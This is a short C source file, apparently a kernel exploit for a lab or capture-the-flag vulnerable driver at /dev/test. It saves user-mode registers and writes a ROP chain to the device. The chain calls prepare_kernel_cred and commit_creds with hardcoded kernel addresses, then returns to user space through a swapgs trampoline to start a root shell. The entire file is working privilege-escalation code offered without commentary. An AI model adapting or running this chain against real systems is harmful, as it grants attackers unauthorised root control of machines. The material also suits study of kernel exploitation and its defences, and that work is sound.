// gcc -masm=intel -static -o exp exp.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>

struct register_val {
    uint64_t user_rip;
    uint64_t user_cs;
    uint64_t user_rflags;
    uint64_t user_rsp;
    uint64_t user_ss;
} __attribute__((packed));

struct register_val rv;

void backup_rv(void) {
    asm("mov rv+8, cs;"
        "pushf; pop rv+16;"
        "mov rv+24, rsp;"
        "mov rv+32, ss;"
       );
}

void shell() {
    execl("/bin/sh", "sh", NULL);
}

int main() {
    int fd;
    size_t rop[20] = {0, };
    
    void *commit_creds = 0xffffffff8108e9f0;
    void *prepare_kernel_cred = 0xffffffff8108ec20;

    fd = open("/dev/test", O_RDWR);

    backup_rv();

    memset(rop, 0x41, 40);
    rop[4] = 0xffffffff813fb9bc;    // pop rdi; ret;
    rop[5] = 0;
    rop[6] = prepare_kernel_cred;
    rop[7] = 0xffffffff813f4eca;    // pop rcx; ret;
    rop[8] = 0;
    rop[9] = 0xffffffff81b2413b;    // mov rdi, rax; rep movs ...; ret;
    rop[10] = commit_creds; 
    rop[11] = 0xffffffff81c00e06;   // swapgs_restore... - mov rdi,rsp;
    rop[12] = 0x41414141;
    rop[13] = 0x41414141;
    rop[14] = &shell;
    rop[15] = rv.user_cs;
    rop[16] = rv.user_rflags;
    rop[17] = rv.user_rsp;
    rop[18] = rv.user_ss;

    write(fd, rop, sizeof(rop));

    close(fd);

    return 0;
}
